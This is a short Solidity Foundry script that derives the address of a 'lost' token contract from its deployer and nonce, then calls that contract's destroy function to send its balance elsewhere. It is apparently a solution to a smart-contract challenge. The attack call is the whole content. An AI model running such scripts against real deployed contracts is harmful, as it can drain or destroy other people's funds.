// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";

interface ISimpleToken{
    function destroy(address payable _to) external;
}

contract DeployAttack is Script {
    address public constant RECOVERY_ADDRESS = 0x65637772Db8FE6129358ea3D4Ef4Cb343ACB435E;
    uint256 public constant NONCE = 1;
    ISimpleToken target;

    function run() public {
        address lostContractAddress = vm.computeCreateAddress(RECOVERY_ADDRESS, NONCE);
        target = ISimpleToken(lostContractAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target.destroy(payable(address(0))); // can put anyone's address
        vm.stopBroadcast();
    }
}